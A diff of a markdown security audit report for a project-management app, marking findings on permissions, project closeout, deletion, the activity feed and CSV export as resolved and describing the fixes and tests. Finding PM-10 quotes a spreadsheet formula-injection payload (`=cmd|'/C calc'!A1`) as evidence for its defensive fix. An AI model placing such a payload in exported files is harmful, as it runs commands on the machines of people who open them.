@@ -1,6 +1,6 @@
 # 01 · The project model, membership & lifecycle
 
-**14 findings** — 8 HIGH · 6 MEDIUM.
+**15 findings** — 8 HIGH · 7 MEDIUM (`PM-15` opened by projects Round G, 2026-09-30, splitting `PM-10` per `DEC-31`).
 
 The server behaviour beneath the already-audited tabs.
 
@@ -64,6 +64,22 @@ lib/projects.ts:259-318 (transitionProjectStatus) writes status/completed_at/can
 - [ ] writes to the project's regulated record (cost_entries, change_orders, checklist_items, turnover_items, punch_items, milestones) on a completed/cancelled/archived project are refused at the DB layer — an RLS predicate or trigger on project status, not a client check — with an explicit controller-only 'reopen' transition that is audited
 - [ ] reopening a project (status → active) is a distinct audited action that clears completed_at / cancelled_at / cancelled_reason rather than leaving them set
 - [ ] a test covers: project cancelled → intake upload with a trusted link → refused, and documents.current_version_id unchanged
+
+**Partial (2026-09-30, projects Round G).** The project side landed (package J8 / PC-2; `DEC-44`); the door's own refusal is PC-1 / J1's and is not done here.
+- Closing revokes the door: `transitionProjectStatus` (`lib/projects.ts`) revokes every live `project_intake_links` row of the project when it moves to completed / cancelled / archived — BEFORE the status changes (fail safe: a refused revocation leaves the project open and says so) — and records `revokedIntakeLinks` in the `PROJECT_<STATUS>` audit row. A revoked link is refused by the upload and resolve routes' existing check (`app/api/intake/upload/route.ts:42` `if (link.revoked_at) return bad("This link has been revoked.", 410)`), before anything is written. `delete_project_record` revokes too (`supabase/migrations/20261103_prj_roundG_project_closeout_rails.sql`). `supabase/migrations/20261103_prj_roundG_project_closeout_rails.sql`'s foot carries the statement (commented, run after reviewing the inventory row) that revokes links left open by closures made before this.
+- The regulated record freezes at the database: `supabase/migrations/20261103_prj_roundG_project_closeout_rails.sql` `enforce_project_record_guard`, BEFORE INSERT / UPDATE / DELETE on cost_entries, change_orders, cost_documents, cost_accounts, project_checklists, checklist_items (through its checklist), turnover_items, punch_items, milestones — a signed-in write on a completed / cancelled / archived project is refused ("…records are read-only. An Admin / Document Control can reopen it."). The service role keeps its pass (house rule; the intake door is J1's).
+- Reopening is a distinct, audited, controller-only act: `supabase/migrations/20261103_prj_roundG_project_closeout_rails.sql` `reopen_project(project, reason)` — controller-only, reason required, sets `active` and CLEARS `completed_at` / `cancelled_at` / `cancelled_reason`, writes the feed row and `PROJECT_REOPENED` (previous status and the cleared values in details), one transaction; `enforce_project_lifecycle_guard` refuses any other way out of a closed status (only the RPC sets `app.project_reopen = 'project:<id>'`). `lib/projects.ts` `reopenProject` calls it; `transitionProjectStatus` refuses closed → open; the page offers Reopen to a controller on a closed project, with a reason prompt.
+- Commits: `7ca202f`, `e0c1aa2`, `9363ebb`
+- Tests: `projects.test.ts` "PM-1 — closing closes the door; reopening is a controller's audited act" (revocation before the status write, refused revocation leaves it open, pause revokes nothing, closed → active refused, reopen RPC / reason / missing-migration message); `projectRailsMigration.test.ts` "20261103 — PM-1: the freeze and the reopen".
+- Pending migration: `supabase/migrations/20261103_prj_roundG_project_closeout_rails.sql` (inventory: closed projects; regulated rows on them; closed projects with un-revoked links).
+
+**Done-when.**
+- Closing auto-revokes the project's intake links — ✓; and /api/intake/resolve + /api/intake/upload reject a token whose project is not in a writable status — **not done here** (PC-1 / J1: the routes read no project status; a link minted on a closed project after closure would still be accepted — `project_intake_links` is not in this package's freeze).
+- Writes to the regulated record on a closed project are refused at the DB layer, with a controller-only audited reopen — ✓ (`supabase/migrations/20261103_prj_roundG_project_closeout_rails.sql`, pending apply).
+- Reopening clears completed_at / cancelled_at / cancelled_reason and is audited — ✓.
+- A test covers project cancelled → trusted-link upload refused, current_version_id unchanged — **partly**: `projects.test.ts` pins that cancelling revokes the link; the route test (upload with that link → 410, no write) belongs with J1's route rebuild, which is rewriting that file now.
+
+**Scope / residual.** The closes-by-status check in both intake routes, and a refusal to mint a link on a closed project, are PC-1 / J1's (their migration 20261104 owns `project_intake_links`).
 
 ---
 
@@ -158,7 +174,7 @@ lib/projectSnapshot.ts:49 and lib/projectReport.ts:54 are byte-identical filters
 ## PM-4 · Project closeout silently fails to release other people's checkouts — the bulk UPDATE is aborted by the release-guard trigger, the error is never read, and the UI and notification both claim the locks were freed
 
 - **Severity:** HIGH
-- **Status:** OPEN
+- **Status:** RESOLVED
 - **Verification:** CONFIRMED
 - **Locations:** `lib/projects.ts:371-415`, `lib/projects.ts:389-399`, `lib/projects.ts:300-317`, `supabase/migrations/20260831_capability_policy_and_rails.sql:80-101`, `app/(protected)/projects/[id]/page.tsx:619-623`, `lib/projects.ts:1039-1045`, `app/api/cron/maintenance/route.ts:88-92`
 - **Independently verified:** ✓ **SURVIVES** — second independent adversarial pass. Survives at HIGH. I specifically checked the refutation that RLS would silently drop the drafter's rows before the trigger fires — it does not, the policy is org-scoped FOR ALL, so the trigger sees them and raises. And no sweep repairs it later: autoReleaseExpiredAdHoc filters `.is("project_id", null)` (lib/projects.ts:1044), so project-linked checkouts are the one class the maintenance cron never touches.
@@ -202,6 +218,19 @@ lib/projects.ts:389-399 is a bare `await supabase.from("checkout_sessions").upda
 - [ ] a project checkout stranded on a completed/cancelled/archived project is reachable by the maintenance sweep (or an explicit controller action), so no document stays locked to a closed project indefinitely
 - [ ] a test covers: non-controller owner + another user's active checkout + transition to 'cancelled' → either all sessions released or an explicit error surfaced, never a silent no-op
 
+**Resolution (2026-09-30, projects Round G).** Reproduced on the DC P6 CHECKOUT version (`2a2ae73`): `releaseAllCheckoutsForProject` was already checked (DCK-9) but still ONE batch UPDATE, so a single release-guard refusal left every session active, the actor's own included — DCK-9's own residual. Now (`lib/projects.ts`): the actor's own sessions end in one statement (the guard never refuses those; a failure there throws); every other session is released on its own, so a refusal holds only that session, which comes back in `stillHeld` with its holder (`{ released, releasedSessionIds, stillHeld }` — `DEC-44`). The authority is the release guard's, unchanged — a controller (anyone holding `checkout.force_release`) releases everyone's. `force_release_document` (20261043) is deliberately NOT used: it ends every active session on the document, including sessions held outside this project, which the per-document settle (a "verified sound" invariant, kept) exists to protect. `transitionProjectStatus` builds the notice body and `releaseError` from the real outcome (`describeReleaseOutcome`: "2 active checkouts were released; 1 is still held by ann."); the confirm copy no longer promises "Every active checkout … will be released". The sweep (`autoReleaseExpiredAdHoc`) also releases a project checkout still active on a project closed more than 24h (`CLOSED_PROJECT_SWEEP_MS`) — same `auto_released` outcome and CHECK_IN rows, its own reason and notice; the page-load path sweeps only the caller's own.
+- Commits: `7ca202f`, `9363ebb`
+- Tests: `projects.test.ts` "PM-4 — the project release is per session…" (own in one statement, others one each, a refusal holds only itself; a non-controller owner still frees their own; notice and message from the real outcome), "PM-4 dw4 — the sweep releases checkouts stranded on a closed project, after 24h"; `checkoutRoundF.test.ts` DCK-9 cases updated to the per-session contract (refusal of another user's session → still held; refusal of the actor's own → thrown).
+
+**Done-when.**
+- Binds and inspects the update error and propagates a real failure — ✓.
+- Per-session release; sessions the actor may not release are reported as "still held by X" — ✓.
+- No claim of release unless the release reported the released ids; confirm and notification reflect the real outcome — ✓.
+- A checkout stranded on a closed project is reachable by the sweep — ✓ (24h after closure).
+- A test covers non-controller owner + another user's active checkout + cancel → an explicit outcome, never a silent no-op — ✓.
+
+**Scope / residual.** None.
+
 ---
 
 <a id="pm-5"></a>
@@ -209,7 +238,7 @@ lib/projects.ts:389-399 is a bare `await supabase.from("checkout_sessions").upda
 ## PM-5 · assertCanManageProject reads only org_members.role and ignores the additive roles[] array, so users the UI and RLS both treat as controllers get 'Only the project owner or an admin can do this'
 
 - **Severity:** MEDIUM
-- **Status:** OPEN
+- **Status:** RESOLVED
 - **Verification:** CONFIRMED
 - **Locations:** `lib/projects.ts:580-595`, `supabase/migrations/20260814_documents_delete_controllers.sql:31-40`, `components/providers/RoleContext.tsx:198-213,364-370`, `app/(protected)/projects/[id]/page.tsx:65-68,131-134`
 - **Independently verified:** ✓ **SURVIVES, corrected** — second independent adversarial pass. Severity **HIGH → MEDIUM** by this pass. The divergence is real and confirmed, but the illustrative scenario is not reachable. org_members.role is kept mirrored to the *highest-ranked* held role — admin/users/page.tsx:129,137 `const headline = primaryRole(cleaned); ... .update({ roles: cleaned, role: headline })` — and ROLE_RANK puts DocCtrl at 70 above every Engineer level (61-64, lib/roleCapabilities.ts:74-86), so a headline-'Engineer' member holding DocCtrl additively cannot be produced. The bug bites only when a role that outranks DocCtrl is the headline — Manager (90), Supervisor (80), DraftingSupervisor (75) — plus additive DocCtrl. It is also fail-closed (a legitimate controller is blocked, no privilege is gained), so MEDIUM rather than HIGH.
@@ -251,6 +280,18 @@ lib/projects.ts:589 `.select("role")` — the roles column is never fetched; :59
 - [ ] a test asserts a member with role='Engineer', roles=['Engineer','DocCtrl'] can transition, edit, delete and transfer a project they do not own
 - [ ] every other server-side ['Admin','DocCtrl'] literal in the projects area is audited for the same scalar-only lookup
 
+**Resolution (2026-09-30, projects Round G).** Record-only for dw1 / dw3 / dw4, per the plan: roles-and-permissions ADD-1 already made `assertCanManageProject` select `role, roles` and use `normalizeRoles` (verified at `2a2ae73`, `lib/projects.ts:656-658`), and `lib/__tests__/sweepRoundC1b.test.ts` is the repo-wide literal census. Residual done here (dw2, DEC-35): the literal `r === "Admin" || r === "DocCtrl"` is replaced by `isControllerPrincipal` from `lib/permissions.ts` — the same rule as `is_org_controller`. `assertCanManageProject` now also requires an ACTIVE membership before the owner branch (projects-tab `SEC-9`).
+- Commit: `7ca202f`
+- Tests: `projects.test.ts` "PM-5 / SEC-9 — who may manage a project" — a member with role `Manager`, roles `['Manager','DocCtrl']` and one with role `Engineer`, roles `['Engineer','DocCtrl']` both manage a project they do not own; `Manager` alone does not; a suspended owner does not.
+
+**Done-when.**
+- Selects `role, roles` and treats either as the controller signal — ✓ (ADD-1; kept).
+- The controller role list comes from the shared helper — ✓ (`isControllerPrincipal`).
+- A test asserts role='Engineer', roles=['Engineer','DocCtrl'] can manage a project they do not own — ✓.
+- Every other server-side ['Admin','DocCtrl'] literal in the projects area is audited — ✓ by pointer (ADD-1's census, `sweepRoundC1b.test.ts`).
+
+**Scope / residual.** The page's `hasAnyRole(["Admin", "DocCtrl"])` is the client's collection-aware check (RoleContext), unchanged.
+
 ---
 
 <a id="pm-6"></a>
@@ -258,7 +299,7 @@ lib/projects.ts:589 `.select("role")` — the roles column is never fetched; :59
 ## PM-6 · deleteProject cascade-destroys the project's entire cost AND quality record (PSSR checklists, turnover acceptance, punch list, change orders, cost entries), while the confirmation dialog promises only 'the project and its schedule'
 
 - **Severity:** HIGH
-- **Status:** OPEN
+- **Status:** RESOLVED
 - **Verification:** CONFIRMED
 - **Locations:** `lib/projects.ts:597-617`, `app/(protected)/projects/[id]/page.tsx:400-414`, `supabase/migrations/20261013_project_controls_program.sql:117,142,156,175,194`, `supabase/migrations/20260819_orphan_tables_backfill.sql:141,162,182,205`, `supabase/migrations/20260609_phase1_normalization.sql:69`
 - **Independently verified:** ✓ **SURVIVES** — second independent adversarial pass. Confirmed on every leg. I looked for a BEFORE DELETE guard, an archive-instead-of-delete path, or a retention/legal-hold trigger on projects — none exists (20260826_legal_hold_delete_guard.sql attaches triggers only to `documents` and `document_versions`). The audit row at lib/projects.ts:612-616 carries `details: { name: p.name }` and no count of what was destroyed.
@@ -294,6 +335,22 @@ lib/projects.ts:604-610 is the complete pre-delete cleanup — five statements, 
 - [ ] the pre-delete cleanup either runs inside one RPC/transaction or is ordered so the projects DELETE is attempted first, so a failure cannot leave a live project with its roster, feed and schedule already destroyed
 - [ ] R2 objects referenced by the deleted cost_documents.file_url are queued for the orphan sweep rather than silently stranded
 
+**Resolution (2026-09-30, projects Round G).** Worked as one defect with `QUAL-3` (and projects-tab `SEC-9`'s decision). Reproduced: `deleteProject` stripped the roster, feed and schedule BEFORE the projects DELETE, cascaded the cost and quality record, and audited `{ name }`. Decision `DEC-44` (the plan's default): a project carrying ANY cost or quality row is archived, not deleted — hard delete of such a project is a controller's act with a stated reason; a project under `projects.legal_hold` is deleted by nobody.
+- `supabase/migrations/20261103_prj_roundG_project_closeout_rails.sql`: `delete_project_record(project, reason)` — SECURITY DEFINER, owner or controller, row locked; refuses a held project; refuses a project with records unless the caller is a controller AND gives a reason; counts every table (`counts`), snapshots the cost and quality rows (`snapshot`; `parsed` quote bodies left out), records the cost documents' storage keys (`orphanedStorageKeys` — PM-6 dw5: recorded for the orphan sweep, whose collector is admin-and-org BKP-2 / intelligence ILIFE-1), revokes the project's intake links (`PM-2`'s inline limb), writes `PROJECT_DELETED` with all of it, and only THEN deletes — children first in an order that fires no ON DELETE SET NULL update on a guarded row, then the schedule, then the project — one transaction, under `app.record_purge = 'project:<id>'` (the GUC contract shared with PC-7 / J3's money guards, spelled exactly). `enforce_project_delete_guard` (BEFORE DELETE on projects) refuses any other delete of a project with records, and a held project always; `project_regulated_record_count` is the one count (EXECUTE revoked from every client role).
+- `lib/projects.ts` `deleteProject` calls the RPC; before `supabase/migrations/20261103_prj_roundG_project_closeout_rails.sql` it deletes only a record-less project (every count read and zero), the projects row FIRST, then the schedule rows it named, audited with the counts — anything else is refused ("archive it instead"). `countProjectRecords` / `describeProjectRecords` / `regulatedRecordTotal` drive the confirm: the page lists the live counts; a non-controller is told the project can't be deleted and to archive it; a controller confirms, then gives a reason.
+- Commits: `7ca202f`, `e0c1aa2`, `9363ebb`
+- Tests: `projects.test.ts` "PM-6 / QUAL-3 — deleting a project counts, audits and refuses" (the RPC with the reason; the database refusal reaches the user; pre-migration: a project with records is refused with nothing deleted; a record-less one deletes the project row first then the schedule, audited with counts; an unreadable count is unknown, never zero); `projectRailsMigration.test.ts` "20261103 — PM-6 / QUAL-3" (GUC spelling, controller + reason, audit before the first delete, the delete order, the guard); `projectPageRoundG.test.ts` "PM-6 / QUAL-3 — the delete confirm".
+- Pending migration: `supabase/migrations/20261103_prj_roundG_project_closeout_rails.sql` (inventory: projects carrying cost / quality rows — each can now only be archived or deleted by a controller with a reason).
+
+**Done-when.**
+- The confirmation enumerates exactly what will be destroyed, driven by live counts — ✓.
+- A project carrying financial or quality records cannot be hard-deleted — archive, or a controller plus an explicit second confirmation that writes the counts and a snapshot — ✓.
+- The retention / legal-hold guard reaches projects — ✓ (`projects.legal_hold`, controller-set, blocks the project and every regulated row).
+- The cleanup runs inside one transaction or deletes the project first — ✓ (one RPC; the pre-migration path deletes the project row first).
+- R2 objects of deleted cost documents are queued for the orphan sweep — ✓ recorded (`orphanedStorageKeys` in the audit row); the collector is BKP-2 / ILIFE-1's.
+
+**Scope / residual.** `audit_logs` is org-readable (`SEC-19` in projects-tab): the `PROJECT_DELETED` snapshot of a private project is as readable as that project's other controls audit rows already are.
+
 ---
 
 <a id="pm-7"></a>
@@ -301,7 +358,7 @@ lib/projects.ts:604-610 is the complete pre-delete cleanup — five statements, 
 ## PM-7 · project_activity attribution is forgeable and cross-project: the INSERT policy checks only org membership, not the actor's identity, the project's visibility, or that the project belongs to that org
 
 - **Severity:** HIGH
-- **Status:** OPEN
+- **Status:** RESOLVED
 - **Verification:** CONFIRMED
 - **Locations:** `supabase/migrations/20260906_projects_hardening.sql:117-121`, `supabase/migrations/20260913_projects_rls_recursion_fix.sql:89-92`, `lib/projects.ts:169-186`, `lib/projects.ts:430-454`, `lib/projects.ts:680-709`
 - **Independently verified:** ✓ **SURVIVES** — second independent adversarial pass. Verified the claim of absence repo-wide: no trigger on project_activity exists anywhere in supabase/migrations, and no later migration re-creates the insert policy. Because project_id is unchecked while org_id is the only thing validated, a member of org A can also plant a row against a project in org B (the SELECT policy then keys visibility off project_visible_to_me(project_id), so org B reads it).
@@ -338,6 +395,19 @@ There is no UPDATE policy on project_activity at all (full inventory via `grep -
 - [ ] comment posting goes through a path that stamps identity server-side rather than accepting actorUserId/actorEmail from the client
 - [ ] existing rows where user_id does not correspond to an active member of project_org(project_id) are surfaced for review — forged history already in the table stays there otherwise
 
+**Resolution (2026-09-30, projects Round G).** Reproduced: `project_activity_insert` (20260906:117-121) checked only that the caller is an active member of the ROW's `org_id`. `supabase/migrations/20261102_prj_roundG_project_rails.sql` section 3: the policy now requires `user_id = auth.uid()`, `org_id = project_org(project_id)` and `project_visible_to_me(project_id)`; a `comment` needs a controller or `can_manage_project` (an observer cannot post — `PM-11`); a `doc_added` / `doc_removed` row needs the register's authority (controller or active owner). `trg_project_activity_stamp` (BEFORE INSERT, SECURITY DEFINER, `search_path` pinned) stamps `user_id`, `user_name` (the member's email) and `created_at` from the SESSION for a signed-in caller — the author of a feed row is who wrote it, whatever the client sent (dw3: identity is server-stamped; the lib's `userId` / `userName` are a pre-migration fallback only). No UPDATE policy. `writeActivity` is checked (`PM-9`).
+- Commits: `e0c1aa2`, `7ca202f`
+- Tests: `projectsRls.test.ts` "PM-7 — the project feed" (final policy set: the four terms; no UPDATE / ALL policy); `projectRailsMigration.test.ts` "20261102 — PM-7 / PM-9 / PM-11: the feed" (the stamp trigger's body); `projects.test.ts` "a refused insert throws".
+- Pending migration: `supabase/migrations/20261102_prj_roundG_project_rails.sql` — its inventory reports the rows whose author is not an active member of the project's org (dw4: surfaced for review, never rewritten).
+
+**Done-when.**
+- WITH CHECK requires `user_id = auth.uid()` and `org_id = project_org(project_id)` — ✓ (system rows are written by the service role, which bypasses RLS, or by SECURITY DEFINER RPCs that name the actor).
+- The insert is gated on `project_visible_to_me(project_id)` — ✓.
+- Comment posting stamps identity server-side — ✓ (the stamp trigger).
+- Existing rows whose author is not an active member are surfaced for review — ✓ (the inventory count; the review query is the inventory's WHERE clause).
+
+**Scope / residual.** None beyond the pending migration.
+
 ---
 
 <a id="pm-8"></a>
@@ -345,7 +415,7 @@ There is no UPDATE policy on project_activity at all (full inventory via `grep -
 ## PM-8 · project_documents grants every active org member full ALL access — any Viewer can attach or detach documents from any project, including private ones
 
 - **Severity:** MEDIUM
-- **Status:** OPEN
+- **Status:** RESOLVED
 - **Verification:** CONFIRMED
 - **Locations:** `supabase/migrations/20260609_phase1_normalization.sql:192-197`, `supabase/migrations/20260609_phase1_normalization.sql:66-75`, `components/projects/ProjectDocumentsCard.tsx:119-144`, `app/(protected)/projects/[id]/page.tsx:461-471`
 - **Independently verified:** ✓ **SURVIVES, corrected** — second independent adversarial pass. Severity **HIGH → MEDIUM** by this pass. The authorization gap is real and exactly as described — any active org member, Viewer included, can INSERT or DELETE project_documents rows for any project including private ones, with no activity trail (the `doc_added`/`doc_removed` writes at ProjectDocumentsCard.tsx:111-117 only happen on the UI path). Lowering to MEDIUM because the blast radius is the link row and its provenance (source, first_seen_at), not any document: `documents` rows survive untouched, and nothing in the evidence pipeline reads project_documents (gatherProjectEvidenceState in lib/checklists.ts:238-294 sources titles from intake_collection_id, sow_document_id and turnover_items.document_id, never from project_documents).
@@ -378,6 +448,19 @@ supabase/migrations/20260609_phase1_normalization.sql:194-197 is quoted above ve
 - [ ] the trigger-maintained 'checkout' rows remain insertable by checkouts_resync_project_documents (it runs as the invoking user — confirm it still succeeds for a collaborator checking a doc out, or make it SECURITY DEFINER with a pinned search_path)
 - [ ] attach/detach writes a doc_added/doc_removed row that the actor cannot forge (see the project_activity finding)
 
+**Resolution (2026-09-30, projects Round G).** Same defect as projects-tab `SEC-17` (worked there; drafting-flow `PROJ-3` closes by pointer). `supabase/migrations/20261102_prj_roundG_project_rails.sql` section 4 DROPS `project_documents_member_all` and creates `project_documents_select` (`project_visible_to_me(project_id)`), `_insert` / `_update` (`is_org_controller(org_id) OR is_project_owner(project_id)` AND `org_id = project_org(project_id)`), `_delete` (owner or controller). `checkouts_resync_project_documents` is re-created SECURITY DEFINER with `search_path` pinned (20260609's body, lineDiff-pinned, plus a guard linking only a session whose org is its project's org), so a collaborator's checkout still lands its row. `ProjectDocumentsCard` writes `doc_added` / `doc_removed` through `writeActivity` — checked, author stamped by the database (`PM-7`), and only the register's authority may write those types.
+- Commits: `e0c1aa2`, `9363ebb`
+- Tests: see projects-tab `SEC-17`; `projectPageRoundG.test.ts` "a refused feed row after a successful detach is shown, not swallowed".
+- Pending migration: `supabase/migrations/20261102_prj_roundG_project_rails.sql` (inventory: rows whose org is not their project's org).
+
+**Done-when.**
+- Split into a visibility-gated SELECT and a write policy limited to `is_org_controller(org_id) OR is_project_owner(project_id)` — ✓.
+- WITH CHECK asserts `org_id = project_org(project_id)` — ✓.
+- The trigger-maintained rows remain insertable for a collaborator — ✓ (SECURITY DEFINER, pinned).
+- Attach / detach write a feed row the actor cannot forge — ✓ (stamped author; type-gated insert).
+
+**Scope / residual.** None beyond the pending migration.
+
 ---
 
 <a id="pm-9"></a>
@@ -385,7 +468,7 @@ supabase/migrations/20260609_phase1_normalization.sql:194-197 is quoted above ve
 ## PM-9 · Posting a comment or any activity never advances projects.last_activity_at for non-owners — the UPDATE is silently filtered out by RLS and the error is discarded
 
 - **Severity:** MEDIUM
-- **Status:** OPEN
+- **Status:** RESOLVED
 - **Verification:** CONFIRMED
 - **Locations:** `lib/projects.ts:169-186`, `supabase/migrations/20260906_projects_hardening.sql:60-65`, `app/(protected)/projects/page.tsx:61-88`, `lib/projects.ts:199-230`
 - **Independently verified:** ✓ **SURVIVES** — second independent adversarial pass. Confirmed, including the claim of absence: grep over supabase/ finds `last_activity_at` only at 20260527_projects_and_collaboration.sql:42 (column) and :52 (index) — no trigger and no RPC maintains it, so the client UPDATE is the only writer. For a non-owner non-controller the UPDATE matches zero rows under RLS (not an error), and the return value is discarded, so every collaborator-driven comment/attach/join leaves the timestamp stale.
@@ -427,6 +510,19 @@ lib/projects.ts:181-185 quoted above, with the comment 'Touch last_activity_at s
 - [ ] posting a comment as a collaborator is verified to move the project to the top of the Active list
 - [ ] any existing stale-warning logic is re-checked against back-filled last_activity_at values (currently understated for most projects)
 
+**Resolution (2026-09-30, projects Round G).** Reproduced: `writeActivity` bound neither error and its `UPDATE projects SET last_activity_at` is filtered out by RLS for every non-owner. `supabase/migrations/20261102_prj_roundG_project_rails.sql`: `trg_project_activity_touch_project` (AFTER INSERT, SECURITY DEFINER, `search_path` pinned) advances `projects.last_activity_at` to the row's time for EVERY author, and a one-time backfill sets it to each project's newest feed row. `writeActivity` no longer UPDATEs `projects` (nor `updated_at`, which is the edit stamp) and throws on a refused insert ("The project activity row was not written: …"); a feed row written AFTER its change committed reports the refusal without pretending the change failed (`createProject` / `transitionProjectStatus` / `bulkCheckoutToProject` carry it in the audit row or result; member, checkout and edit actions say "saved, but the project feed row was not written" after their notices).
+- Commits: `7ca202f`, `e0c1aa2`
+- Tests: `projects.test.ts` "PM-7 / PM-9 — the feed write is checked and no longer touches projects"; `projectRailsMigration.test.ts` "last_activity_at is advanced by an AFTER INSERT trigger for every author, and backfilled".
+- Pending migration: `supabase/migrations/20261102_prj_roundG_project_rails.sql` — until it is applied NO author's activity advances `last_activity_at` (the client UPDATE that worked only for owners is gone); the inventory reports how many projects the backfill advances.
+
+**Done-when.**
+- last_activity_at maintained by an AFTER INSERT trigger — ✓.
+- writeActivity binds and inspects the error — ✓ (there is now one statement).
+- A collaborator's comment moves the project to the top of the Active list — ✓ by construction (the trigger + `listProjects`' `order("last_activity_at", desc)`); live after `supabase/migrations/20261102_prj_roundG_project_rails.sql`.
+- Stale-warning logic re-checked against back-filled values — ✓: the only consumer is the dashboard's quiet-days column (`components/dashboard/widgets.tsx:940-988`), which reads the same column and needs no change.
+
+**Scope / residual.** None beyond the pending migration.
+
 ---
 
 <a id="pm-10"></a>
@@ -434,7 +530,7 @@ lib/projects.ts:181-185 quoted above, with the comment 'Touch last_activity_at s
 ## PM-10 · Project CSV export writes unescaped formula characters — project names and descriptions become live formulas when the file opens in Excel
 
 - **Severity:** MEDIUM
-- **Status:** OPEN
+- **Status:** RESOLVED
 - **Verification:** CONFIRMED
 - **Locations:** `lib/projectExport.ts:12-22`, `lib/projectExport.ts:70-91`, `lib/projectExport.ts:94-105`, `app/(protected)/projects/[id]/page.tsx:323-331`, `app/(protected)/projects/page.tsx:103-114`
 - **Independently verified:** ✓ **SURVIVES** — second independent adversarial pass. Correct — and note the quoting rule actively helps the payload: `=cmd|'/C calc'!A1` contains no comma/quote/newline, so it is emitted bare. The only sanitizer in the file is at :110, `String(bundle.project.name).replace(/[^a-z0-9-_ ]/gi, "_")`, which is applied to the download FILENAME only, not to the cell contents.
@@ -469,6 +565,18 @@ lib/projectExport.ts:13-18 quoted verbatim — the regex `/[",\n\r]/` tests only
 - [ ] a test asserts that a project named `=1+1` round-trips into the CSV as an inert text cell
 - [ ] the guard lives in one shared helper so future exporters inherit it
 
+**Resolution (2026-09-30, projects Round G).** Reproduced: `csvField` quoted only for `" , CR LF`; a leading `=` `+` `-` `@` or TAB went through, and quoting does not neutralise it. New `lib/csvSafe.ts` — `csvCell` / `csvLine` / `isFormulaLike` / `CSV_FORMULA_LEADERS`: a value whose first character is `= + - @ TAB CR` is written as `"'<value>"` (the apostrophe convention, inside a quoted cell, quotes doubled); everything else keeps the existing escaping; BOM and extension unchanged (`DEC-44`). `lib/projectExport.ts` encodes every cell through it (its own `csvField` is gone).
+- Commit: `f4c65a9`
+- Tests: `projects.test.ts` "PM-10 — CSV cells are never live formulas" (`=1+1` → `"'=1+1"`, the HYPERLINK payload, all six leaders); `projectExport.test.ts` "a project named =1+1 and a purpose starting with =cmd are written as quoted, apostrophe-prefixed text" (no cell of the file begins with a formula character), "the exporter's only cell encoder is lib/csvSafe".
+
+**Done-when.**
+- csvField prefixes = + - @ TAB CR with a quote-wrapped apostrophe — ✓.
+- The same guard is applied to every other CSV/TSV producer — **split per DEC-31** into `PM-15` (six producers in other packages' files; the helper is exported for them). `lib/dataExport.ts` / `lib/exportTables.ts` write JSON and `lib/xlsxData.ts` only reads workbooks — none of the three writes CSV.
+- A test asserts a project named `=1+1` round-trips as an inert text cell — ✓.
+- The guard lives in one shared helper — ✓ (`lib/csvSafe.ts`).
+
+**Scope / residual.** `PM-15`.
+
 ---
 
 <a id="pm-11"></a>
@@ -476,7 +584,7 @@ lib/projectExport.ts:13-18 quoted verbatim — the regex `/[",\n\r]/` tests only
 ## PM-11 · Project member roles (collaborator / observer) are decorative — nothing anywhere reads them, so an 'observer' has exactly the powers of a 'collaborator'
 
 - **Severity:** MEDIUM
-- **Status:** OPEN
+- **Status:** RESOLVED
 - **Verification:** CONFIRMED
 - **Locations:** `types/schema.ts:944`, `app/(protected)/projects/[id]/page.tsx:924-927`, `app/(protected)/projects/[id]/page.tsx:131-134,952`, `lib/projects.ts:482-523,660-674`, `supabase/migrations/20260913_projects_rls_recursion_fix.sql:74-86`, `supabase/migrations/20260527_projects_and_collaboration.sql:61-62`
 - **Independently verified:** ✓ **SURVIVES** — second independent adversarial pass. The claim of absence holds under a full-repo search — no RLS policy, API route, or lib function branches on collaborator vs observer. An observer can post into the regulated activity feed (project_activity_insert requires only org membership) exactly as a collaborator can.
@@ -501,6 +609,19 @@ types/schema.ts:944: `export type ProjectMemberRole = "owner" | "collaborator" |
 - [ ] canComment / canManage derive from the member role where a role is meant to matter, rather than from bare membership
 - [ ] updateMember refuses to set role='owner' (ownership moves only through transferOwnership, which updates projects.owner_user_id), or transferOwnership is the only writer of that value
 - [ ] the UI's isOwner derivation stops trusting project_members.role as a proxy for authority
+
+**Resolution (2026-09-30, projects Round G).** Database half record-only: roles-and-permissions `SURF-11` / 20261047 made `can_manage_project` admit only `owner` / `collaborator` roster rows (verified in the file). App half and the comment rail done here (`DEC-44` default: keep the observer option, enforce it): `supabase/migrations/20261102_prj_roundG_project_rails.sql`'s insert policy refuses an observer's `comment`; the page's `canComment` excludes observers and the picker says "Observer — can see, cannot manage or comment" (projects-tab `UX-14`); `updateMember` and `addMember` refuse `role: 'owner'` — ownership moves only through `transferOwnership` / `transfer_project_ownership`, which also moves `owner_user_id`; the page's `isOwner` (header and roster) reads `projects.owner_user_id` only, and a roster row that merely says `owner` is labelled "owner (roster only)" with no owner protection.
+- Commits: `7ca202f`, `e0c1aa2`, `9363ebb`
+- Tests: `projects.test.ts` "PM-11 — 'owner' is set only by a transfer"; `projectPageRoundG.test.ts` "authority is projects.owner_user_id; an observer gets no comment box…".
+- Pending migration: `supabase/migrations/20261102_prj_roundG_project_rails.sql` (inventory: roster rows with role owner whose user is not the project's owner).
+
+**Done-when.**
+- The role is enforced — observer cannot post, owner-role rows reconciled with owner_user_id — ✓ (observer: UI + database after `supabase/migrations/20261102_prj_roundG_project_rails.sql`; owner rows: no writer sets them outside the transfer; the inventory counts the historical mismatches).
+- canComment / canManage derive from the role where it matters — ✓ (`canComment`; `canManage` stays owner-or-controller, matching the write policies).
+- updateMember refuses role='owner' — ✓ (and addMember).
+- The UI's isOwner stops trusting project_members.role — ✓.
+
+**Scope / residual.** Notification audiences still include observers (notifications `PROD-4`).
 
 ---
 
@@ -617,7 +738,7 @@ ProjectWizard.tsx:157-163 (`if (accErr) console.warn(...)`), :167-172 (`.then(()
 ## PM-14 · is_org_controller — the SECURITY DEFINER predicate behind every projects, cost and controls RLS policy — has no SET search_path
 
 - **Severity:** LOW
-- **Status:** OPEN
+- **Status:** RESOLVED
 - **Verification:** CONFIRMED
 - **Locations:** `supabase/migrations/20260814_documents_delete_controllers.sql:31-40`, `supabase/migrations/20260906_projects_hardening.sql:62,68,76,95,124,171`, `supabase/migrations/20261013_project_controls_program.sql:238,246,264,269,274,281,286`
